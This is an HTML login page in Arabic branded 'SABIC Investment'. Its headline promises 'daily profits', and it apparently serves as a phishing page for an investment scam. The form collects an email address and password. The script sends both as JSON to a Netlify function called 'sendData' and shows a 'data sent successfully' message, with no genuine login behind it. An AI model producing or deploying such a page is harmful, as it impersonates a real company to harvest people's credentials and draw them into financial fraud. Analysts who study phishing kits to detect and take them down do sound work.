<!DOCTYPE html>
<html lang="ar">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>سابك للاستثمار - تسجيل الدخول</title>
<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet">
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Cairo', sans-serif; }

  body {
    min-height: 100vh;
    background: linear-gradient(135deg, #1f1c2c, #928dab);
    display: flex;
    justify-content: center;
    align-items: center;
    overflow: hidden;
    position: relative;
  }

  /* خلفية متحركة ضخمة */
  body::before {
    content: "";
    position: absolute;
    width: 300%;
    height: 300%;
    background: radial-gradient(circle, rgba(255,255,255,0.1) 0%, transparent 70%);
    animation: rotateBG 40s linear infinite;
    z-index: 0;
  }

  @keyframes rotateBG {
    0% { transform: rotate(0deg) translate(0,0); }
    100% { transform: rotate(360deg) translate(0,0); }
  }

  /* اسم الشركة بألوان قوس قزح ضخم */
  .company-name {
    position: absolute;
    top: 30px;
    font-size: 72px;
    font-weight: 900;
    width: 100%;
    text-align: center;
    background: linear-gradient(90deg, red, orange, yellow, green, blue, indigo, violet);
    background-size: 400% 100%;
    -webkit-background-clip: text;
    -webkit-text-fill-color: transparent;
    animation: rainbow 10s linear infinite;
    z-index: 2;
  }

  @keyframes rainbow {
    0% { background-position: 0% 50%; }
    100% { background-position: 100% 50%; }
  }

  /* الحاوية الرئيسية */
  .container {
    background: rgba(255,255,255,0.95);
    border-radius: 40px;
    padding: 80px 90px;
    max-width: 750px;
    width: 95%;
    box-shadow: 0 35px 70px rgba(0,0,0,0.5);
    text-align: center;
    position: relative;
    z-index: 1;
  }

  .container h1 {
    font-size: 46px;
    margin-bottom: 50px;
    color: #333;
    background: linear-gradient(90deg, #ff6a00, #ee0979);
    -webkit-background-clip: text;
    -webkit-text-fill-color: transparent;
    animation: gradientText 5s infinite alternate;
  }

  @keyframes gradientText {
    0% { background-position: 0% 50%; }
    50% { background-position: 100% 50%; }
    100% { background-position: 0% 50%; }
  }

  .form-group {
    margin-bottom: 35px;
    text-align: left;
    position: relative;
  }

  .form-group label {
    font-weight: 700;
    color: #555;
    display: block;
    margin-bottom: 15px;
    font-size: 22px;
  }

  .form-group input {
    width: 100%;
    padding: 22px 25px;
    border-radius: 22px;
    border: 2px solid #ccc;
    font-size: 22px;
    transition: 0.4s;
  }

  .form-group input:focus {
    border-color: #ff6a00;
    box-shadow: 0 0 22px rgba(255,106,0,0.5);
    outline: none;
  }

  button {
    width: 100%;
    padding: 28px;
    font-size: 26px;
    font-weight: bold;
    border: none;
    border-radius: 25px;
    background: linear-gradient(135deg, #ff6a00, #ee0979);
    color: #fff;
    cursor: pointer;
    transition: 0.4s;
    box-shadow: 0 15px 35px rgba(238,9,121,0.5);
  }

  button:hover {
    transform: scale(1.08);
    box-shadow: 0 18px 45px rgba(238,9,121,0.7);
  }

  .message {
    margin-top: 30px;
    font-size: 20px;
    font-weight: bold;
    color: green;
  }

  /* تأثير الكتابة على الحقول */
  input:valid {
    border-color: #00c853;
    box-shadow: 0 0 18px rgba(0,200,83,0.4);
  }

  @media (max-width: 900px) {
    .container { padding: 60px 30px; }
    .container h1 { font-size: 38px; }
    .form-group label { font-size: 20px; }
    .form-group input { font-size: 20px; padding: 18px 20px; }
    button { font-size: 22px; padding: 22px; }
    .company-name { font-size: 60px; }
  }

</style>
</head>
<body>

<div class="company-name">سابك للاستثمار</div>

<div class="container">
  <h1>سجل دخولك لتحقيق أرباح يومية</h1>
  <form id="loginForm">
    <div class="form-group">
      <label for="email">البريد الإلكتروني</label>
      <input type="email" id="email" placeholder="أدخل بريدك الإلكتروني" required>
    </div>
    <div class="form-group">
      <label for="password">كلمة المرور</label>
      <input type="password" id="password" placeholder="أدخل كلمة المرور" required>
    </div>
    <button type="submit">ابدأ الآن</button>
  </form>
  <div class="message" id="message"></div>
</div>

<script>
  const form = document.getElementById('loginForm');
  const message = document.getElementById('message');

  form.addEventListener('submit', async (e) => {
    e.preventDefault();
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;

    try {
      const response = await fetch('/.netlify/functions/sendData', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email, password })
      });

      const result = await response.json();
      message.textContent = result.message || 'تم إرسال البيانات بنجاح!';
      message.style.color = 'green';
    } catch (err) {
      message.textContent = 'حدث خطأ أثناء الإرسال';
      message.style.color = 'red';
      console.error(err);
    }
  });
</script>

</body>
</html>
